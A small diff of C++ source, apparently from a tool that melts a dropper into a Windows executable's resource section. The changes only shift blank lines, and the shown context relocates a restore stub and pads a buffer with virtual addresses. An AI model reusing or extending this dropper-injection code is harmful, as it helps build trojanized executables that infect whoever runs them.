@@ -56,16 +56,17 @@ StateResult InjectDropper::process()
 	DEBUG_MSG(D_VERBOSE, "Sending resource data: %d", (DWORD) section->SizeOfRawData);
 
 	
+
 	// relocate restore stub with currentOffset
 	Dropper& dropper = context<StreamingMelter>().dropper();
 	dropper.restoreStub( context<StreamingMelter>().currentVA() );
-
 
 
 	unsigned int uOutpuBufferLen = alignTo(uDirSize + sizeof(IMAGE_RESOURCE_DIRECTORY_ENTRY) + sizeof(IMAGE_RESOURCE_DATA_ENTRY), 4);
 	for (unsigned int i=uOutpuBufferLen; i<0x1000; i+=4)
 		*(unsigned int *)(filler + i) = context<StreamingMelter>().currentVA() + 0x1500;
 	context<StreamingMelter>().complete(filler, 0x1000);
+
 
 
 	std::size_t dropperSize = dropper.size() - 0x1000;
